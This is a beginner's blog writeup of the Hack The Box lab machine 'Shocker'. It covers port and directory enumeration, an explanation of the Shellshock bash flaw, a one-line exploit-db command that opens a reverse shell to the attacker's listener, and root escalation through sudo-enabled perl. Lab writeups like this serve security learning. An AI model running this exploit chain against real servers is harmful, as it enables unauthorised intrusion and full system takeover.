---
layout: single
title: "Shocker - Linux HacktheBox Writeup"
categories:
  - Writeup
tags:
  - Easy
  - Linux
  - HackTheBox
classes:
  - wide
---

Shocker is my first box on Hack The Box. After spending the last few weeks on TryHackMe, it feels scary but exciting to finally start hacking into boxes untethered.

So the first thing I do when faced with a box, is **enumeration**. 

Enumeration is the process by which we can obtain a connection to the target and discover potential attack angles. An example of a few elements we're often looking for in this step are the following: 

- Ports
- Credentials (Usernames, Passwords, Groupnames..etc) 
- Machine names
- Apps and banners  

For Shocker, because we have access to an IP address, I just open up my terminal and plug it in with my favorite tool: Nmap. 
The following is the output:
```
PORT     STATE SERVICE VERSION

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
So we can see two open ports of interest. An http address and an ssh port.

The next tool we can use is Gobuster because we might be able to find some interesting directories via the website.
While gobuster is running, we can quickly check out the website. Checking the page source doesn't provide us with anything too interesting. 
Back on gobuster's side of things, we get the following results:

```
gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/small.txt -s 307,200,204,301,302,403 -x txt,sh,cgi,pl -t 50

> /cgi-bin/ (Status: 403)
```
Running a second time to to recurse the found directory I find:

```
gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirb/small.txt -s 307,200,204,301,302,403 -x txt,sh,cgi,pl -t 50

> /user.sh
```
This appears to be a bash script. Might be useful for our foothold.
At this point of the box, I decided to look up more information on the bash script in the cgi-bin directory.

A number of results come back talking about the 'shellshock' exploit. This makes sense as the name of the box is shocker. 
I start to research the exploit instead, to read  more about it.

So Shellshock appears to be a security issue allowing Bash to execute commands. So remote code execution in other words. 
From an explanation online:

''*Bash supports exporting not just shell variables, but also shell functions to other bash instances, via the process environment to (indirect) child processes.  Current bash versions use an environment variable named by the function name, and a function definition starting with “() {” in the variable value to propagate function definitions through the environment.  The vulnerability occurs because bash does not stop after processing the function definition; it continues to parse and execute shell commands following the function definition.*''

Done with enumeration for now, we can move on to exploitation, or getting a foothold.

Using exploit-db, a website dedicated to provided lists of exploits and CVEs, we find our exploit in question at:
[https://www.exploit-db.com/exploits/34900](https://www.exploit-db.com/exploits/34900)

Using the example command syntax, we can download the script and input the command into our terminal to get ourselves a reverse-shell.

```
python 34900.py payload=reverse rhost=10.10.10.56 lhost=tun0 lport=1234 pages=/cgi-bin/user.sh
```
Success! We have a shell as the user Shelly! 
Let's find ourselves a user flag.

```
10.10.10.56> cd / 
10.10.10.56> cd /home/shelly
10.10.10.56> ls -a 
10.10.10.56> cat user.txt
```
The first flag has been caught. 
Onto the next one!

So the next step is looking for the root flag. This requires root privileges to head into the root directory. 
So we first should check the priveleges our current user has. 
According to sudo -l, Shelly can run the perl command using sudo without any passwords. This is great. 
Using the nice [GTFObins database](https://gtfobins.github.io/), we can run a nice one liner to grab root shell and therefore system own by finding our last flag. 

```

# id
uid=0(root) 

```
Yay!